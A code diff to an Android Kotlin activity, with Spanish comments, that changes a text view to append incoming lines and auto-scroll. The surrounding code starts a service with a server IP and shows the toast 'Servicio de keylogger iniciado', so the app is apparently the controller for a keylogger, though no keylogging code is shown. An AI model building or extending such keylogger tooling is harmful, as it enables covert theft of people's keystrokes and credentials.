@@ -8,6 +8,7 @@ import android.os.Handler
 import android.os.Looper
 import android.widget.Button
 import android.widget.EditText
+import android.widget.ScrollView
 import android.widget.TextView
 import android.widget.Toast
 
@@ -20,14 +21,11 @@ import android.widget.Toast
 
 class MainActivity : AppCompatActivity() {
 
-    // Definir textView como una propiedad de la clase
     private lateinit var textView: TextView
-
-    // Handler para actualizar la UI desde el hilo principal
     private val handler = Handler(Looper.getMainLooper()) { message ->
-        // Actualizar el TextView con los datos recibidos
+        // Agregar la nueva línea al TextView
         val data = message.obj as String
-        textView.text = data
+        appendToTextView(data)
         true
     }
 
@@ -60,6 +58,18 @@ class MainActivity : AppCompatActivity() {
         intent.putExtra("SERVER_IP", ip)
         startService(intent)
         Toast.makeText(this, "Servicio de keylogger iniciado", Toast.LENGTH_SHORT).show()
+    }
+
+    // Función para agregar texto al TextView y hacer scroll automático
+    private fun appendToTextView(text: String) {
+        runOnUiThread {
+            textView.append("$text\n") // Agrega la nueva línea al final
+            // Desplaza el ScrollView hacia abajo para mostrar el último contenido
+            val scrollView = textView.parent as ScrollView
+            scrollView.post {
+                scrollView.fullScroll(ScrollView.FOCUS_DOWN)
+            }
+        }
     }
 }
 
